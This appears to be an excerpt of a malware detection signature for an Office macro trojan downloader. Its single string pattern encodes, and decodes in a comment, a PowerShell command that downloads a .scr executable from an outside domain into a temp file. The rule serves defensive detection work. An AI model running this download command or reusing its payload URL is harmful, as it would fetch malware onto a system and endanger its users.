...
rule TrojanDownloader_O97M_Powdow_STV_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.STV!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 01 00 "
	...
	strings :
		...
		$a_01_1 = {49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 2d 55 72 69 20 22 22 68 74 74 70 73 3a 2f 2f 6f 66 66 69 63 65 72 65 70 72 65 73 65 6e 74 61 74 69 76 65 2e 63 6f 6d 2f 78 6c 73 2f 54 43 25 32 30 31 25 32 30 41 48 54 53 41 25 32 30 31 30 39 33 25 32 30 31 30 39 34 25 32 30 52 4f 2e 73 63 72 22 22 20 2d 4f 75 74 46 69 6c 65 20 24 54 65 6d 70 46 69 6c 65 3b } //01 00  Invoke-WebRequest -Uri ""https://officerepresentative.com/xls/TC%201%20AHTSA%201093%201094%20RO.scr"" -OutFile $TempFile;
